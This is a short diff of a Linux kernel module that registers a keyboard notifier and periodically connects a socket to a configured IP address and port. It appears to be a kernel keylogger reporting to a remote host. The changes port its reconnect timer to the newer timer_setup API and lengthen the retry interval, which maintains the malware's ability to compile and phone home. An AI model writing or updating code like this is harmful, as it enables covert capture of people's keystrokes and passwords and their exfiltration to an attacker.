@@ -56,13 +56,15 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
 }
 
 
-void initialize_conn() {
+void initialize_conn(struct timer_list *t) {
+    int result;
+
     result = create_socket(IP_ADDRESS, PORT);
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
     }
 
-    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(20000));
 }
 
 
@@ -75,8 +77,8 @@ static int __init keyboard_module_init(void) {
         return result;
     }
 
-    setup_timer(&connection_timer, initialize_conn, 0);
-    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
+    timer_setup(&connection_timer, initialize_conn, 0);
+    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(20000));
 
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
